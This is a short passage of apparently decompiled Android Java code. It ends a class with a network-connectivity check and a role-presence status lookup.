        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public boolean haveInternet() {
        NetworkInfo info = ((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo();
        if (info == null) {
            return false;
        }
        if (info.isConnected()) {
            return true;
        }
        return false;
    }

    /* access modifiers changed from: private */
    public Boolean Getstatus(String strRole) {
        if (new PresenceType(this).GetPresenceType(strRole).booleanValue()) {
            return Boolean.valueOf(true);
        }
        return Boolean.valueOf(false);
    }
}
